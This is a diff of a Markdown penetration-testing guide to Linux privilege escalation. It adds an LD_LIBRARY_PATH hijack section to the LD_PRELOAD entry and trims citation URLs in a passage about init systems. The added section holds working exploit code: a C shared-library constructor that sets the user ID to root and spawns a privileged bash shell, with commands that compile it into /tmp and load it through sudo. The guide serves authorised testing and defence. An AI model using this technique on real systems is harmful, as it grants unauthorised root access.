@@ -905,7 +905,7 @@ export -f /usr/sbin/service
 
 Then, when you call the suid binary, this function will be executed
 
-### LD\_PRELOAD
+### LD\_PRELOAD & **LD\_LIBRARY\_PATH**
 
 **LD\_PRELOAD** is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library (libc.so) This is called preloading a library.
 
@@ -943,6 +943,30 @@ Finally, **escalate privileges** running
 
 ```bash
 sudo LD_PRELOAD=pe.so <COMMAND> #Use any command you can run with sudo
+```
+
+{% hint style="danger" %}
+A similar privesc can be abused if the attacker controls the **LD\_LIBRARY\_PATH** env variable because he controls the path where libraries are going to be searched.
+{% endhint %}
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+static void hijack() __attribute__((constructor));
+
+void hijack() {
+        unsetenv("LD_LIBRARY_PATH");
+        setresuid(0,0,0);
+        system("/bin/bash -p");
+}
+```
+
+```bash
+# Compile & execute
+cd /tmp
+gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
+sudo LD_LIBRARY_PATH=/tmp <COMMAND>
 ```
 
 ### SUID Binary – so injection
@@ -1494,12 +1518,12 @@ DEVICE=eth0
 
 ### **init, init.d, systemd, and rc.d**
 
-`/etc/init.d` contains **scripts** used by the System V init tools (SysVinit). This is the **traditional service management package for Linux**, containing the `init` program (the first process that is run when the kernel has finished initializing¹) as well as some infrastructure to start and stop services and configure them. Specifically, files in `/etc/init.d` are shell scripts that respond to `start`, `stop`, `restart`, and (when supported) `reload` commands to manage a particular service. These scripts can be invoked directly or (most commonly) via some other trigger (typically the presence of a symbolic link in `/etc/rc?.d/`). (From [here](https://askubuntu.com/questions/5039/what-is-the-difference-between-etc-init-and-etc-init-d#:\~:text=%2Fetc%2Finit%20contains%20configuration%20files,the%20status%20of%20a%20service.))\
+`/etc/init.d` contains **scripts** used by the System V init tools (SysVinit). This is the **traditional service management package for Linux**, containing the `init` program (the first process that is run when the kernel has finished initializing¹) as well as some infrastructure to start and stop services and configure them. Specifically, files in `/etc/init.d` are shell scripts that respond to `start`, `stop`, `restart`, and (when supported) `reload` commands to manage a particular service. These scripts can be invoked directly or (most commonly) via some other trigger (typically the presence of a symbolic link in `/etc/rc?.d/`). (From [here](https://askubuntu.com/questions/5039/what-is-the-difference-between-etc-init-and-etc-init-d))\
 Other alternative to this folder is `/etc/rc.d/init.d` in Redhat
 
-`/etc/init` contains **configuration** files used by **Upstart**. Upstart is a young **service management package** championed by Ubuntu. Files in `/etc/init` are configuration files telling Upstart how and when to `start`, `stop`, `reload` the configuration, or query the `status` of a service. As of lucid, Ubuntu is transitioning from SysVinit to Upstart, which explains why many services come with SysVinit scripts even though Upstart configuration files are preferred. In fact, the SysVinit scripts are processed by a compatibility layer in Upstart. (From [here](https://askubuntu.com/questions/5039/what-is-the-difference-between-etc-init-and-etc-init-d#:\~:text=%2Fetc%2Finit%20contains%20configuration%20files,the%20status%20of%20a%20service.))
+`/etc/init` contains **configuration** files used by **Upstart**. Upstart is a young **service management package** championed by Ubuntu. Files in `/etc/init` are configuration files telling Upstart how and when to `start`, `stop`, `reload` the configuration, or query the `status` of a service. As of lucid, Ubuntu is transitioning from SysVinit to Upstart, which explains why many services come with SysVinit scripts even though Upstart configuration files are preferred. In fact, the SysVinit scripts are processed by a compatibility layer in Upstart. (From [here](https://askubuntu.com/questions/5039/what-is-the-difference-between-etc-init-and-etc-init-d))
 
-**systemd** is a **Linux initialization system and service manager that includes features like on-demand starting of daemons**, mount and automount point maintenance, snapshot support, and processes tracking using Linux control groups. systemd provides a logging daemon and other tools and utilities to help with common system administration tasks. (From [here](https://www.linode.com/docs/quick-answers/linux-essentials/what-is-systemd/#:\~:text=The%20%2Frun%2Fsystemd%2Fsystem,anywhere%20else%20in%20the%20system.))\
+**systemd** is a **Linux initialization system and service manager that includes features like on-demand starting of daemons**, mount and automount point maintenance, snapshot support, and processes tracking using Linux control groups. systemd provides a logging daemon and other tools and utilities to help with common system administration tasks. (From [here](https://www.linode.com/docs/quick-answers/linux-essentials/what-is-systemd/))\
 Files that ships in packages downloaded from distribution repository go into `/usr/lib/systemd/`. Modifications done by system administrator (user) go into `/etc/systemd/system/`.
 
 ## Other Tricks
